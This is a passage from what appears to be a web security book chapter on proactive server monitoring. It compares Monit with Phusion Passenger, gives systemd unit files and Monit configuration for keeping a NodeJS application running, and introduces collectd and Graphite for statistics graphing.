  <li>Security by default. Just <a href="#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication-ssh-perms">like SSH</a>, to protect the security of your control file and passwords the control file must have read-write permissions no more than <code>0700 (</code>u=xrw,g=,o=`); Monit will complain and exit otherwise, again, security by default.</li>
</ul>

<p>
  <strong>Documentation</strong>
</p>

<p>The following was the documentation I used in the same order and I found that the most helpful.</p>

<ol class="numeric">
  <li><a href="https://mmonit.com/monit/">Main web site</a></li>
  <li>Clean concise <a href="https://mmonit.com/monit/documentation/monit.html">Official Documentation</a> all on one page with hyper-links</li>
  <li>Source and links to other <a href="https://bitbucket.org/tildeslash/monit/src">documentation</a> including a QUICK START guide of about 6 lines</li>
  <li><a href="https://mmonit.com/wiki/Monit/Systemd">Adding Monit to systemd</a></li>
  <li><a href="https://mmonit.com/monit/changes/">Release notes</a></li>
  <li>The monit control file itself has excellent documentation in the form of commented examples. Just uncomment and modify to suite your use case.</li>
</ol>

<p>
  <strong>Does it Meet Our Goals</strong>
</p>

<ol class="numeric">
  <li>Application can start automatically on system boot</li>
  <li>Monit has a plethora of different types of tests it can perform and then follow up with actions based on the outcomes. <a href="http://mmonit.com/monit/documentation/monit.html#HTTP">Http</a> is but one of them.</li>
  <li>Monit covers this nicely, you still need to be integrity checking Monit though.</li>
  <li>Ability to add the following later without having to swap the chosen offering:
    <ol class="numeric">
      <li>Reverse proxy: Yes, I do not see any issues here</li>
      <li>Integrate NodeJSs core module <a href="https://nodejs.org/api/cluster.html">cluster</a> into your NodeJS application for load balancing. Monit will still monitor, restart and do what ever else you tell it to do.</li>
      <li>Monit provides application statistics to look at if that is what you want, but it also goes further and provides directives for you to declare behaviour based on conditions that Monit checks for and can execute.</li>
    </ol>
  </li>
  <li>Plenty of official and community supplied documentation</li>
  <li>Yes it is production ready and has been for many years and is still very actively maintained. It is proven itself. Some extra education around some of the <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit-features-that-stand-out">points</a> I raised above with some of the security features would be good.</li>
</ol>

<p>
  <strong>Overall Thoughts</strong>
</p>

<p>There was accepted answer on <a href="http://stackoverflow.com/questions/7259232/how-to-deploy-node-js-in-cloud-for-high-availability-using-multi-core-reverse-p">Stack Overflow</a> that discussed a pretty good mix and approach to using the right tools for each job. Monit has a lot of capabilities, none of which you must use, so it does not get in your way, as many opinionated tools do and like to dictate how you do things and what you must use in order to do them. I have been using Monit now for several years and just forget that it is even there, until it barks because something is not quite right. Monit allows you to leverage what ever you already have in your stack, it plays very nicely with all other tools. Monit under sells and over delivers. You do not have to install package managers or increase your attack surface other than <code>[apt-get|aptitude] install monit</code>. It is easy to configure and has lots of good documentation.</p>

<h6 id="vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger">Passenger</h6>

<p>I have looked at Passenger before and it looked quite good then. It still does, with one main caveat. It is trying to do to much. One can easily get lost in the official documentation (<a href="http://mmonit.com/wiki/Monit/Installation">example</a> of the Monit install (handfull of commands to cover all Linux distributions on one page) vs Passenger <a href="https://www.phusionpassenger.com/documentation/Users%20guide%20Standalone.html#installation">install</a> (many pages to get through)).  <em>Passenger is a web server and application server, designed to be fast, robust and lightweight. It runs your web applications with the least amount of hassle by taking care of almost all administrative heavy lifting for you.</em> I would like to see the actual weight rather than just a relative term lightweight. To me it does not look light weight. The feeling I got when evaluating Passenger was similar to the feeling produced with my <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec">Ossec evaluation</a>.</p>

<p>The learning curve is quite a bit steeper than all the previous offerings. Passenger has strong opinions that once you buy into could make it hard to use the tools you may want to swap in and out. I am not seeing the <a href="http://en.wikipedia.org/wiki/Unix_philosophy">UNIX Philosophy</a> here.</p>

<p>If you looked at the Phusion Passenger Philosophy when it was available, seems to have been removed now, you would see some note-worthy comments. We believe no good software has bad documentation. If your software is 100% intuitive, the need for documentation should be minimal. Few software products are 100% intuitive, because we only have so much time to develop them. The <a href="https://github.com/phusion/passenger/wiki/Phusion-Passenger:-Meteor-tutorial#what-passenger-doesnt-do">comment around</a> the Unix way is interesting also. At this stage I am not sure this is the Unix way. I would like to spend some time with someone or some team that has Passenger in production in a diverse environment and see how things are working out.</p>

<p>Passenger is not in the Debian repositories, so you would need to add the apt repository.</p>

<p>Passenger is seven years old at the time of writing this, but the NodeJS support is only just over two years old.</p>

<p>
  <strong>Features that Do Not really Stand Out</strong>
</p>

<p>Sadly there were not many that stood out for me.</p>

<ul>
  <li>The <a href="https://www.phusionpassenger.com/handle_more_traffic">Handle more traffic</a> marketing material looked similar to <a href="http://mmonit.com/monit/documentation/monit.html#RESOURCE-TESTING">Monit resource testing</a> but without the detail. If there is something Monit can not do well, it will say Hay, use this other tool and I will help you configure it to suite the way you want to work. If you do not like it, swap it out for something else With Passenger it seems to integrate into everything rather than providing tools to communicate loosely. Essentially locking you into a way of doing something that hopefully you like. It also talks about Uses all available CPU cores. If you are using Monit you can use the NodeJS cluster module to take care of that. Again leaving the best tool for the job to do what it does best.</li>
  <li>
<a href="https://www.phusionpassenger.com/reduce_maintenance">Reduce maintenance</a>
    <ul>
      <li><strong><em>Keep your app running, even when it crashes</em></strong>. <em>Phusion Passenger supervises your application processes, restarting them when necessary. That way, your application will keep running, ensuring that your website stays up. Because this is automatic and builtin, you do not have to setup separate supervision systems like Monit, saving you time and effort.</em> but this is what we want, we want a separate supervision (monitoring) system, or at least a very small monitoring daemon, and this is what Monit excels at, and it is so much easier to set-up than Passenger. This sort of marketing does not sit right with me.</li>
      <li><strong><em>Host multiple apps at once</em></strong>. <em>Host multiple apps on a single server with minimal effort.</em> If we are talking NodeJS web apps, then they are their own server. They host themselves. In this case it looks like Passenger is trying to solve a problem that does not exist, at least in regards to NodeJS?</li>
    </ul>
  </li>
  <li>
<a href="https://www.phusionpassenger.com/improve_security">Improve security</a>
    <ul>
      <li><strong><em>Privilege separation</em></strong>. <em>If you host multiple apps on the same system, then you can easily run each app as a different Unix user, thereby separating privileges.</em>. The Monit <a href="https://mmonit.com/monit/documentation/monit.html#PROGRAM-STATUS-TESTING">documentation</a> says this: If Monit is run as the super user, you can optionally run the program as a different user and/or group. and goes on to provide examples how it is done. So again I do not see anything new here. Other than the Slow client protections which has side affects, that is it for security considerations with Passenger. Monit has security woven through every aspect of itself.</li>
    </ul>
  </li>
  <li>What I saw happening here, was a lot of stuff that as a security focussed proactive monitoring tool, was not required. Your mileage may vary.</li>
</ul>

<p>
  <strong>
    <a href="https://www.phusionpassenger.com/download">Offerings</a>
  </strong>
</p>

<p>Phusion Passenger is a commercial product that has enterprise, custom and open source (which is free and has many features).</p>

<p>
  <strong>Documentation</strong>
</p>

<p>The following was the documentation I used in the same order and I found that the most helpful.</p>

<ol class="numeric">
  <li>NodeJS <a href="https://github.com/phusion/passenger/wiki/Phusion-Passenger%3A-Node.js-tutorial">tutorial</a>, this got me started with how it could work with NodeJS</li>
  <li><a href="https://www.phusionpassenger.com/">Main web site</a></li>
  <li><a href="https://www.phusionpassenger.com/documentation_and_support">Documentation and support portal</a></li>
  <li><a href="https://www.phusionpassenger.com/documentation/Design%20and%20Architecture.html">Design and Architecture</a></li>
  <li><a href="https://www.phusionpassenger.com/library/">User Guide Index</a></li>
  <li><a href="https://www.phusionpassenger.com/documentation/Users%20guide%20Nginx.html">Nginx specific User Guide</a></li>
  <li><a href="https://www.phusionpassenger.com/documentation/Users%20guide%20Standalone.html">Standalone User Guide</a></li>
  <li>
<a href="https://twitter.com/phusion_nl">Twitter</a>, <a href="https://blog.phusion.nl/">blog</a>
</li>
  <li>IRC: <code>#passenger</code> at <code>irc.freenode.net</code>. I was on there for several days. There was very little activity.</li>
  <li><a href="https://github.com/phusion/passenger">Source</a></li>
</ol>

<p>
  <strong>Does it Meet Our Goals</strong>
</p>

<ol class="numeric">
  <li>Application should start automatically on system boot. There is no doubt that Passenger goes way beyond this aim.</li>
  <li>Application should be re-started if it dies or becomes un-responsive. There is no doubt that Passenger goes way beyond this aim.</li>
  <li>I have not seen Passenger provide any file integrity or time-stamp checking features</li>
  <li>Ability to add the following later without having to swap the chosen offering:
    <ol class="numeric">
      <li>Reverse proxy: Passenger provides Integrations into Nginx, Apache and stand-alone (provide your own proxy)</li>
      <li>Passenger scales up NodeJS processes and automatically load balances between them</li>
      <li>Passenger is advertised as offering easily viewable <a href="https://www.phusionpassenger.com/identify_and_fix_problems">statistics</a>. I have not seen many of them though</li>
    </ol>
  </li>
  <li>There is loads of official documentation. Not as much community contributed though.</li>
  <li>From what I have seen so far, I would say Passenger may be production ready. I would like to see more around how security was baked into the architecture though before I committed to using it in production. I am just not seeing it.</li>
</ol>

<p>
  <strong>Overall Thoughts</strong>
</p>

<p>I spent quite a while reading the documentation. I just think it is doing to much. I prefer to have stronger single focused tools that do one job, do it well and play nicely with all the other kids in the sand pit. You pick the tool up and it is just intuitive how to use it, and you end up reading docs to confirm how you think it should work. For me, this was not my experience with passenger.</p>

<p></p>

<aside>
  <p>If you are looking for something even more comprehensive, check out <a href="http://en.wikipedia.org/wiki/Zabbix">Zabbix</a>.<br />
If you like to pay for your tools, check out Nagios if you have not already.</p>

</aside>

<p>At this point it was fairly clear as to which components I would like to use to keep my NodeJS application(s) monitored, alive and healthy along with any other scripts and processes.</p>

<p>Systemd and Monit.</p>

<p>Going with the default for the init system should give you a quick start and provide plenty of power. Plus it is well supported, reliable, feature rich and you can manage anything/everything you want without installing extra packages.</p>

<p>For the next level up, I would choose Monit. I have now used it in production and it has taken care of everything above the init system with a very simple configuration. I feel it has a good level of abstraction, plenty of features, never gets in the way, and integrates nicely into your production OS(s) with next to no friction.</p>

<h6 id="vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit">Getting Started with Monit</h6>

<p>So we have installed Monit with an <code>apt-get install monit</code> and we are ready to start configuring it.</p>

<figure class="code">
<div class="highlight"><pre><code></code>ps aux <code class="p">|</code> grep -i monit
</pre></div>

</figure>

<p>Will reveal that Monit is running:</p>

<figure class="code">
<div class="highlight"><pre><code></code>/usr/bin/monit -c /etc/monit/monitrc
</pre></div>

</figure>

<p>The first thing we need to do is make some changes to the control file (<code>/etc/monit/monitrc</code> in Debian). The control file has sensible defaults already. At this stage I do not need a web UI accessible via localhost or any other hosts, but it still needs to be turned on and accessible by at least localhost. <a href="http://mmonit.com/monit/documentation/monit.html#MONIT-HTTPD">Here is why</a>:</p>

<p><em>Note that if HTTP support is disabled, the Monit CLI interface will have reduced functionality, as most CLI commands (such as monit status) need to communicate with the Monit background process via the HTTP interface. We strongly recommend having HTTP support enabled. If security is a concern, bind the HTTP interface to local host only or use Unix Socket so Monit is not accessible from the outside.</em></p>

<p>In order to turn on the httpd, all you need in your control file for that is:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># only accept connection from localhost</code>
<code class="nb">set</code> httpd port <code class="m">2812</code> and use address localhost
<code class="c1"># allow localhost to connect to the server and</code>
allow localhost
</pre></div>

</figure>

<p>If you want to receive alerts via email, then you will need to <a href="https://mmonit.com/monit/documentation/monit.html#Setting-a-mail-server-for-alert-delivery">configure that</a>. Then on reload you should get start and stop events (when you quit).</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo monit reload
</pre></div>

</figure>

<p>Now if you issue a <code>curl localhost:2812</code> you should get the web UIs response of a html page. Now you can start to play with the Monit CLI. Monit can also be seen listening in the <code>netstat</code> output <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim">above</a> where we disabled and removed services.</p>

<p>Now to stop the Monit background process use:</p>

<figure class="code">
<div class="highlight"><pre><code></code>monit quit
</pre></div>

</figure>

<p>You can find all the arguments you can throw at Monit in the documentaion under <a href="https://mmonit.com/monit/documentation/monit.html#Arguments">Arguments</a>, or just issue:</p>

<figure class="code">
<div class="highlight"><pre><code></code>monit -h <code class="c1"># will list all options.</code>
</pre></div>

</figure>

<p>To check the control file for syntax errors:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo monit -t
</pre></div>

</figure>

<p>Also keep an eye on your log file which is specified in the control file:<br />
<code>set logfile /var/log/monit.log</code></p>

<p>Right. So what happens when Monit dies..?</p>

<h6 id="leanpub-auto-keep-monit-alive">Keep Monit Alive</h6>

<p>Now you are going to want to make sure your monitoring tool that can be configured to take all sorts of actions never just stops running, leaving you flying blind. No noise from your servers means all good right? Not necessarily. Your monitoring tool just has to keep running, no ifs or buts about it. So let us make sure of that now.</p>

<p>When Monit is <code>apt-get install</code>ed on Debian, it gets installed and configured to run as a daemon. This is defined in Monits init script.<br />
Monits init script is copied to <code>/etc/init.d/</code> and the run levels set-up for it upon installation. This means when ever a run level is entered the init script will be run taking either the single argument of <code>stop</code> (example: <code>/etc/rc0.d/K01monit</code>), or <code>start</code> (example: <code>/etc/rc2.d/S17monit</code>). Remember we <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim">discussed run levels</a> previously?</p>

<p>
  <strong>systemd to the rescue</strong>
</p>

<p>Monit is very stable, but if for some reason it dies, then it will not be <a href="https://mmonit.com/monit/documentation/monit.html#INIT-SUPPORT">automatically restarted</a> again. In saying that I have never had Monit die on any of my servers being monitored.<br />
This is where systemd comes in. systemd is installed out of the box on Debian Jessie on-wards. Ubuntu uses Upstart on 14.10 which is similar, Ubuntu 15.04 uses systemd. Both SysV init and systemd can act as drop-in replacements for each other or even work along side of each other, which is the case in Debian Jessie. If you add a unit file which describes the properties of the process that you want to run, then issue some magic commands, the systemd unit file will take precedence over the init script (<code>/etc/init.d/monit</code>).</p>

<p>Before we get started, let us get some terminology established. The two concepts in systemd we need to know about are unit and target.</p>

<ol class="numeric">
  <li>A unit is a configuration file that describes the properties of the process that you would like to run. There are many examples of these that I can show you, and I will point you in the direction soon. They should have a <code>[Unit]</code> directive at a minimum. The syntax of the unit files and the target files were derived from Microsoft Windows <code>.ini</code> files. Now I think the idea is that if you want to have a <code>[Service]</code> directive within your unit file, then you would append <code>.service</code> to the end of your unit file name.</li>
  <li>A target is a grouping mechanism that allows systemd to start up groups of processes at the same time. This happens at every boot as processes are started at different run levels.</li>
</ol>

<p>Now in Debian there are two places that systemd looks for unit files In order from lowest to highest precedence, they are as follows:</p>

<ol class="numeric">
  <li>
<code>/lib/systemd/system/</code> (prefix with <code>/usr</code> dir for archlinux) unit files provided by installed packages. Have a look in here for many existing examples of unit files.</li>
  <li>
<code>/etc/systemd/system/</code> unit files created by the system administrator.</li>
</ol>

<p>As mentioned <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit-systemd">above</a>, systemd should be the first process started on your Linux server. systemd reads the different targets and runs the scripts within the specific targets <code>target.wants</code> directory (which just contains a collection of symbolic links to the unit files). For example the target file we will be working with is the <code>multi-user.target</code> file (actually we do not touch it, systemctl does that for us (as per the magic commands mentioned above)). Just as systemd has two locations in which it looks for unit files. I think this is probably the same for the target files, although there was not any target files in the system administrator defined unit location, but there were some <code>target.wants</code> files there.</p>

<p>
  <strong>systemd Monit Unit file</strong>
</p>

<p>I found a template that Monit had already provided for a unit file in<br />
<code>/usr/share/doc/monit/examples/monit.service</code>. There is also one for Upstart. Copy that to where the system administrator unit files should go, as mentioned above, and make the change so that systemd restarts Monit if it dies for what ever reason. Check the <code>Restart=</code> options on the <a href="http://www.dsm.fordham.edu/cgi-bin/man-cgi.pl?topic=systemd.service">systemd.service man page</a>. The following is what my initial unit file looked like:</p>

<figure class="code">
  <figcaption>/etc/systemd/system/monit.service</figcaption>

<div class="highlight"><pre><code></code><code class="o">[</code>Unit<code class="o">]</code>
<code class="nv">Description</code><code class="o">=</code>Pro-active monitoring utility <code class="k">for</code> unix systems
<code class="nv">After</code><code class="o">=</code>network.target
 
<code class="o">[</code>Service<code class="o">]</code>
<code class="nv">Type</code><code class="o">=</code>simple
<code class="nv">ExecStart</code><code class="o">=</code>/usr/bin/monit -I -c /etc/monit/monitrc
<code class="nv">ExecStop</code><code class="o">=</code>/usr/bin/monit -c /etc/monit/monitrc quit
<code class="nv">ExecReload</code><code class="o">=</code>/usr/bin/monit -c /etc/monit/monitrc reload
<code class="nv">Restart</code><code class="o">=</code>always
 
<code class="o">[</code>Install<code class="o">]</code>
<code class="nv">WantedBy</code><code class="o">=</code>multi-user.target
</pre></div>

</figure>

<p>Now, some explanation. Most of this is pretty obvious. The <code>After=</code> directive just tells systemd to make sure the <code>network.target</code> file has been acted on first and of course <code>network.target</code> has <code>After=network-pre.target</code> which does not have a lot in it. I am not going to go into this now, as I do not really care too much about it. It works. It means the network interfaces have to be up first. If you want to know how, why, check the <a href="https://www.freedesktop.org/wiki/Software/systemd/NetworkTarget/">systemd NetworkTarget documentation</a>. <code>Type=simple</code>. Again check the systemd.service man page.
Now to have systemd control Monit, Monit must not run as a background process (the default). To do this, we can either add the <code>set init</code> statement to Monits control file or add the <code>-I</code> option when running systemd, which is exactly what we have done above. The <code>WantedBy=</code> is the target that this specific unit is part of.</p>

<p>Now we need to tell systemd to create the symlinks in the <code>/etc/systemd/system/multi-user.target.wants</code> directory and other things. See the <a href="http://www.dsm.fordham.edu/cgi-bin/man-cgi.pl?topic=systemctl">systemctl man page</a> for more details about what enable actually does if you want them. You will also need to start the unit.</p>

<p>Now what I like to do here is:</p>

<figure class="code">
<div class="highlight"><pre><code></code>systemctl status /etc/systemd/system/monit.service
</pre></div>

</figure>

<p>Then compare this output once we enable the service:</p>

<figure class="code">
<div class="highlight"><pre><code></code> monit.service - Pro-active monitoring utility <code class="k">for</code> unix systems
   Loaded: loaded <code class="o">(</code>/etc/systemd/system/monit.service<code class="p">;</code> disabled<code class="o">)</code>
   Active: inactive <code class="o">(</code>dead<code class="o">)</code>
</pre></div>

</figure>

<figure class="code">
<div class="highlight"><pre><code></code>sudo systemctl <code class="nb">enable</code> /etc/systemd/system/monit.service
</pre></div>

</figure>

<p>systemd now knows about monit.service</p>

<figure class="code">
<div class="highlight"><pre><code></code>systemctl status /etc/systemd/system/monit.service
</pre></div>

</figure>

<p>Outputs:</p>

<figure class="code">
<div class="highlight"><pre><code></code> monit.service - Pro-active monitoring utility <code class="k">for</code> unix systems
   Loaded: loaded <code class="o">(</code>/etc/systemd/system/monit.service<code class="p">;</code> enabled<code class="o">)</code>
   Active: inactive <code class="o">(</code>dead<code class="o">)</code>
</pre></div>

</figure>

<p>Now start the service:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo systemctl start monit.service <code class="c1"># there's a stop and restart also.</code>
</pre></div>

</figure>

<p>Now you can check the <code>status</code> of your Monit service again. This shows terse runtime information about the units or PID you specify (monit.service in our case).</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo systemctl status monit.service
</pre></div>

</figure>

<p>By default this function will show you 10 lines of output. The number of lines can be controlled with the <code>--lines=</code> option:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo systemctl --lines<code class="o">=</code><code class="m">20</code> status monit.service
</pre></div>

</figure>

<p>Now try <code>kill</code>ing the Monit process. At the same time, you can watch the output of Monit in another terminal. <a href="https://tmux.github.io/">tmux</a> or <a href="https://blog.binarymist.net/2011/11/27/centerim-irssi-alpine-on-screen/#screen">screen</a> is helpful for this:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo tail -f /var/log/monit.log
</pre></div>

</figure>

<figure class="code">
<div class="highlight"><pre><code></code>sudo <code class="nb">kill</code> -SIGTERM <code class="k">$(</code>pidof monit<code class="k">)</code>
<code class="c1"># SIGTERM is a safe kill and is the default, so you don't actually need to specify it.</code>
<code class="c1"># Be patient, this may take a minute or two for the Monit process to terminate.</code>
</pre></div>

</figure>

<p>Or you can emulate a nastier termination with <code>SIGKILL</code> or even <code>SEGV</code> (which may kill monit faster).</p>

<p>Now when you run another <code>status</code> command you should see the PID has changed. This is because systemd has restarted Monit.</p>

<p>When you need to make modifications to the unit file, you will need to run the following command after save:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo systemctl daemon-reload
</pre></div>

</figure>

<p>When you need to make modifications to the running services configuration file<br />
<code>/etc/monit/monitrc</code> for example, you will need to run the following command after save:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo systemctl reload monit.service
<code class="c1"># because systemd is now in control of Monit,</code>
<code class="c1"># rather than the before mentioned: sudo monit reload</code>
</pre></div>

</figure>

<h6 id="vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive">Keep NodeJS Application Alive</h6>

<p>Right, we know systemd is always going to be running. So lets use it to take care of the coarse grained service control. That is keeping your NodeJS service alive.</p>

<p>
  <strong>Using systemd</strong>
</p>

<p>
  <strong>systemd my-nodejs-app Unit file</strong>
</p>

<p>You will need to know where your NodeJS binary is. The following will provide the path:</p>

<figure class="code">
<div class="highlight"><pre><code></code>which NodeJS
</pre></div>

</figure>

<p>Now create a systemd unit file <code>my-nodejs-app.service</code></p>

<figure class="code">
  <figcaption>/etc/systemd/system/my-nodejs-app.service</figcaption>

<div class="highlight"><pre><code></code><code class="o">[</code>Unit<code class="o">]</code>
<code class="nv">Description</code><code class="o">=</code>My amazing NodeJS application
<code class="nv">After</code><code class="o">=</code>network.target

<code class="o">[</code>Service<code class="o">]</code>
<code class="c1"># systemctl start my-nodejs-app # to start the NodeJS script</code>
<code class="nv">ExecStart</code><code class="o">=[</code>where nodejs binary lives<code class="o">]</code> <code class="o">[</code>where your app.js/index.js lives<code class="o">]</code>
<code class="c1"># systemctl stop my-nodejs-app # to stop the NodeJS script</code>
<code class="c1"># SIGTERM (15) - Termination signal. This is the default and safest way to kill process.</code>
<code class="c1"># SIGKILL (9) - Kill signal.</code>
    <code class="c1"># Use SIGKILL as a last resort to kill process.</code>
    <code class="c1"># This will not save data or cleaning kill the process.</code>
<code class="nv">ExecStop</code><code class="o">=</code>/bin/kill -SIGTERM <code class="nv">$MAINPID</code>
<code class="c1"># systemctl reload my-nodejs-app # to perform a zero-downtime restart.</code>
<code class="c1"># SIGHUP (1) - Hangup detected on controlling terminal or death of controlling process.</code>
<code class="c1"># Use SIGHUP to reload configuration files and open/close log files.</code>
<code class="nv">ExecReload</code><code class="o">=</code>/bin/kill -HUP <code class="nv">$MAINPID</code>
<code class="nv">Restart</code><code class="o">=</code>always
<code class="nv">StandardOutput</code><code class="o">=</code>syslog
<code class="nv">StandardError</code><code class="o">=</code>syslog
<code class="nv">SyslogIdentifier</code><code class="o">=</code>my-nodejs-app
<code class="nv">User</code><code class="o">=</code>my-nodejs-app
<code class="nv">Group</code><code class="o">=</code>my-nodejs-app <code class="c1"># Not really needed unless it's different,</code>
<code class="c1"># as the default group of the user is chosen without this option.</code>
<code class="c1"># Self documenting though, so I like to have it present.</code>
<code class="nv">Environment</code><code class="o">=</code><code class="nv">NODE_ENV</code><code class="o">=</code>production

<code class="o">[</code>Install<code class="o">]</code>
<code class="nv">WantedBy</code><code class="o">=</code>multi-user.target
</pre></div>

</figure>

<p>Add the system user and group so systemd can actually run your service as the user you have specified.</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># The following line is not needed if you adduser like below:</code>
sudo groupadd --system my-nodejs-app
<code class="c1"># To verify which groups exist:</code>
getent group
<code class="c1"># This will create a system group with the same name and ID of the user:</code>
sudo adduser --system --no-create-home --group my-nodejs-app
groups my-nodejs-app <code class="c1"># to verify which groups the new user is in.</code>
</pre></div>

</figure>

<p>Now as we did above, go through the same procedure <code>enable</code>ing, <code>start</code>ing and verifying your new service.</p>

<p>Make sure you have your directory permissions set-up correctly and you should have a running NodeJS application that when it dies will be restarted automatically by systemd.</p>

<p>Do not forget to backup all your new files and changes in case something happens to your server.</p>

<p>We are done with systemd for now. The following are some useful resources that I have used:</p>

<ul>
  <li><a href="http://www.cyberciti.biz/faq/kill-process-in-linux-or-terminate-a-process-in-unix-or-linux-systems/"><code>kill</code>ing processes</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Unix_signal">Unix signals</a></li>
  <li>
<a href="https://wiki.archlinux.org/index.php/systemd">Terse guide</a> of systemd commands and some other quick start sort of info</li>
</ul>

<p>
  <strong>Using Monit</strong>
</p>

<p>Now just configure your Monit control file. You can spend a lot of time here tweaking a lot more than just your NodeJS application. There are loads of examples around, and the control file itself has lots of commented out examples also. You will find the following the most helpful:</p>

<ul>
  <li><a href="https://mmonit.com/monit/documentation/monit.html">Official Monit Documentation</a></li>
  <li><a href="http://linux.die.net/man/1/monit">Monit Man page</a></li>
</ul>

<p>There are a few things that had me stuck for a while. By default Monit only sends alerts on change (dark cockpit approach), not on every cycle if the condition stays the same, unless when you set-up your:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nb">set</code> alert your-email@your.domain
</pre></div>

</figure>

<p>Append <code>receive all alerts</code>, so that it looks like this:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nb">set</code> alert your-email@your.domain receive all alerts
</pre></div>

</figure>

<p>There is quite a few things you just work out as you go. The main part I used to health-check my NodeJS app was:</p>

<figure class="code">
  <figcaption>Sub-section of /etc/monit/monitrc</figcaption>

<div class="highlight"><pre><code></code>check host your_server with address your_server
   start <code class="nv">program</code> <code class="o">=</code> <code class="s2">"/bin/systemctl start my-nodejs-app.service"</code>
   stop <code class="nv">program</code> <code class="o">=</code> <code class="s2">"/bin/systemctl stop my-nodejs-app.service"</code>
   <code class="k">if</code> failed ping <code class="k">then</code> alert
   <code class="k">if</code> failed
      port <code class="m">80</code> and
      protocol http and
      <code class="nv">status</code> <code class="o">=</code> <code class="m">200</code> <code class="c1"># The default without status is failure if status code &gt;= 400</code>
      request /testdir with <code class="nv">content</code> <code class="o">=</code> <code class="s2">"some text on my web page"</code> and
         <code class="k">then</code> restart
   <code class="k">if</code> <code class="m">5</code> restarts within <code class="m">5</code> cycles <code class="k">then</code> alert
</pre></div>

</figure>

<p>Carry on and add to, or uncomment, and modify the <code>monitrc</code> file, with the likes of:</p>

<ol class="numeric">
  <li>CPU and memory usage</li>
  <li>Load averages</li>
  <li>File system space on all the mount points</li>
  <li>Check SSH that it has not been restarted by anything other than Monit (potentially swapping the binary or its config). Of course if an attacker kills Monit or systemd immediately restarts it and we get Monit alert(s). We also get real-time logging hopefully to an <a href="chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up">off-site syslog server</a>. Ideally your off-site syslog server also has alerts set-up on particular log events. On top of that you should also have inactivity alerts set-up so that if your log files are not generating events that you expect, then you also receive alerts. Services like <a href="https://deadmanssnitch.com/">Dead Mans Snitch</a> or packages like <a href="https://simple-evcorr.github.io/">Simple Event Correlator</a> with Cron are good for this. On top of all that, if you have a file integrity checker that resides on another system that your host reveals no details of, and you have got it configured to check all the correct file check-sums, dates, permissions, etc, you are removing a lot of low hanging fruit for someone wanting to compromise your system.</li>
  <li>Directory permissions, uid, gid and checksums. I believe the tools Monit uses to do these checks are part of Monit.</li>
</ol>

<h5 id="vps-countermeasures-lack-of-visibility-statistics-graphing">Statistics Graphing</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>This is where <a href="https://collectd.org/">collectd</a> and <a href="https://graphiteapp.org/">graphite</a> come to the party. Both tools do one thing, do it well, and are independent of each other, but are often used together.</p>

<p>Also check the related <a href="chap06.html#web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing">Statistics Graphing</a> section in the countermeasures section of the Web Applications chapter, where we introduce statsd as the collector for application metrics.</p>

<p>Collectd can be used to feed statistics to many consumers, including AWS CloudWatch via a <a href="https://aws.amazon.com/blogs/aws/new-cloudwatch-plugin-for-collectd/">plugin</a>, but using it with graphite (and ultimately <a href="https://grafana.com/">Grafana</a>, which can take inputs from a collection of <a href="https://grafana.com/plugins?type=datasource">data sources</a>, including graphite, Elasticsearch, <a href="http://docs.grafana.org/features/datasources/cloudwatch/">AWS CloudWatch</a>, and others) would provide a much <a href="http://blog.takipi.com/graphite-vs-grafana-build-the-best-monitoring-architecture-for-your-application/">better solution</a>. </p>

<h6 id="leanpub-auto-collectdhttpscollectdorg">
  <a href="https://collectd.org/">Collectd</a>
</h6>

<p><em>Collectd is a daemon which collects system and application performance metrics</em> at a configurable frequency. Almost everything in collectd is done with plugins. Most of the over 100 plugins are used to read statistics from the target system, but plugins are also used to define where to send those statistics, and in the case of distributed systems, read those statistics sent from collectd agents. Collectd is an agent based system metrics collection tool. An agent is deployed on every host that needs to be monitored.</p>

<p>If you want to send statistics over the network, then the network plugin must be loaded. collectd is capable of <a href="https://collectd.org/wiki/index.php/Networking_introduction#Cryptographic_setup">cryptographically signing or encrypting</a> the network traffic it transmits. Collectd is not a complete monitoring solution by it self.</p>

<p>The collectd daemon has no external dependencies and should run on any POSIX supporting system, such as Linux, Solaris, Max OS X, AIX, the BSDs, and probably many others.</p>

<h6 id="leanpub-auto-graphitehttpgraphiteapporg">
  <a href="http://graphiteapp.org/">Graphite</a>
</h6>

<p>Graphite is a statistics storage and visualisation component which consists of:</p>

<ul>
  <li>Carbon - A daemon that listens for time-series data and stores it. Any data sent to Graphite is actually sent to Carbon. The protocols for data transfer that Carbon accepts and understands are:
    <ol class="numeric">
      <li>Plain text, which includes fields:
        <ol class="numeric">
          <li>The metric name</li>
          <li>Value of the statistic</li>
          <li>Timestamp that the statistic was captured</li>
        </ol>
      </li>
      <li>Pickle, because Graphite is written in Python, and Pickle serializers and de-serializers Python object structures. Pickle is good when you want to batch up large amounts of data and have the Carbon pickle receiver accept it</li>
      <li>AMQP, which Carbon can use to listen to a message bus</li>
    </ol>
  </li>
  <li>Whisper - A simple database library for storing time-series data</li>
  <li>Graphite-web - A (Django) webapp that renders graphs on demand</li>
</ul>

